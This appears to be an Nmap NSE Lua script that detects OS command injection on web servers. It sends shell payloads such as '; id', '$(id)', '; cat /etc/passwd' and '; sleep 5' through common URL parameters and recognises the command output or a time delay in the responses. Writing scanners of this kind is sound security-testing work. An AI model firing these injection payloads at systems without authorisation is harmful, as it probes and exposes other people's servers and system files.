-- Command Injection Detection
-- Tests for OS command injection vulnerabilities

local http = require("http")
local stdnse = require("stdnse")

description = [[
Tests for OS command injection vulnerabilities by injecting
shell commands into URL parameters and analyzing responses.
]]

author = "Nemue Security Team"
license = "MIT"
categories = {"vuln", "intrusive", "exploit"}

portrule = function(host, port)
    return port.protocol == "tcp" and
           (port.service == "http" or port.service == "https" or
            port.number == 80 or port.number == 443 or
            port.number == 8080)
end

action = function(host, port)
    local output = {}
    local findings = {}

    local payloads = {
        {"; id", "uid=%d+"},
        {"| id", "uid=%d+"},
        {"`id`", "uid=%d+"},
        {"$(id)", "uid=%d+"},
        {"; cat /etc/passwd", "root:%w*:0:0"},
        {"| cat /etc/passwd", "root:%w*:0:0"},
        {"; whoami", "[%w_]+"},
        {"| whoami", "[%w_]+"},
        {"; sleep 5", nil, 5},
        {"| sleep 5", nil, 5},
        {"; ping -c 3 127.0.0.1", "ttl="},
        {"| ping -c 3 127.0.0.1", "ttl="},
    }

    local params = {"cmd", "exec", "command", "ping", "host", "ip", "query", "file"}
    local test_paths = {"/ping.php", "/traceroute.php", "/tools.php", "/admin/exec.php"}

    for _, test_path in ipairs(test_paths) do
        for _, param in ipairs(params) do
            for _, payload in ipairs(payloads) do
                local url = test_path .. "?" .. param .. "=" .. payload[1]
                local start_time = os.time()
                local r = http.get(host.ip, port, url)
                local elapsed = os.time() - start_time

                if r and r.body then
                    if payload[2] and r.body:find(payload[2]) then
                        table.insert(findings, {
                            url = url,
                            param = param,
                            payload = payload[1],
                            evidence = "Command output detected"
                        })
                        break
                    elseif payload[3] and elapsed >= payload[3] then
                        table.insert(findings, {
                            url = url,
                            param = param,
                            payload = payload[1],
                            evidence = "Time-based: " .. elapsed .. "s delay"
                        })
                        break
                    end
                end
            end
            if #findings > 0 then break end
        end
        if #findings > 0 then break end
    end

    if #findings > 0 then
        table.insert(output, "Command Injection Vulnerabilities Found:")
        table.insert(output, "")
        for _, f in ipairs(findings) do
            table.insert(output, "[!] URL: " .. f.url)
            table.insert(output, "[!]   Parameter: " .. f.param)
            table.insert(output, "[!]   Payload: " .. f.payload)
            table.insert(output, "[!]   Evidence: " .. f.evidence)
            table.insert(output, "")
        end
        table.insert(output, "[!] CRITICAL: Allows remote code execution")
        return stdnse.format_output(true, output)
    end

    return nil
end
